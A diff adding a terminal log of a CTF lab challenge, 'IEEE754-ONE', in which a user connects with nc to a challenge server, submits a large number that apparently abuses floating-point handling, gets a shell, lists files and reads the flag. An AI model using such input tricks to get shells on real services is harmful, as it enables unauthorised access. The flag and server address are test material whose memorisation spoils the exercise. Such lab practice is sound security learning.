@@ -1,0 +1,28 @@
+/靶场/实验室考核2/IEEE754-ONE git:main*  
+❯ nc 120.26.60.25 20211        
+Do you want to get the flag?
+We need to have our capital verified.
+To prove that you have enough money to obtain the flag.
+Please tell me how much of your assets you have.
+4,756,540,486,875,873,280
+Please tell me your name.
+We need to see if you have reached a certain level of financial stability.
+Oh my God, you are a millionaire. You have reached the level of our capital verification standards.
+Congratulations! You have successfully obtained the flag.
+
+aa
+/bin/sh: 2: aa: not found
+a
+/bin/sh: 3: a: not found
+
+
+ls
+bin
+dev
+flag
+lib
+lib64
+libexec
+pwn
+cat flag
+HYNUCTF{Is_D0uBLe_Ieee_7S4!!!}
